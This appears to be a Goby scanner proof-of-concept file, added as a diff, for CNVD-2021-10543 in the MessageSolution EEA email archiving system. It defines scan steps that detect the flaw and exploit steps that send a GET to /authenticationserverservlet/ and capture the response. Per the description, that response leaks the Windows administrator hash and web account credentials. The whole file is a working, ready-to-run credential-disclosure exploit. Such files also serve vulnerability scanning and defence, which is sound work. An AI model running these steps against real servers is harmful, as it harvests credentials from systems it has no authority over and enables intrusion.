@@ -1,0 +1,70 @@
+{
+      "Name": "MessageSolution  邮件归档系统EEA 信息泄露漏洞 CNVD-2021-10543",
+      "Level": "2",
+      "Tags": [
+            "账号密码泄露"
+      ],
+      "GobyQuery": "title=\"MessageSolution Enterprise Email Archiving (EEA)\" ",
+      "Description": "MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码",
+      "Product": "MessageSolution企业邮件归档管理系统",
+      "Homepage": "PeiQi",
+      "Author": "PeiQi",
+      "Impact": "<p>🐏</p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+	  "HasExp": true,
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/authenticationserverservlet/",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "administrator",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/authenticationserverservlet/",
+                        "follow_redirect": true,
+                        "header": {},
+                        "data_type": "text",
+                        "data": ""
+                  },
+				  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-03-22 14:21:12",
+      "GobyVersion": "1.8.237"
+}
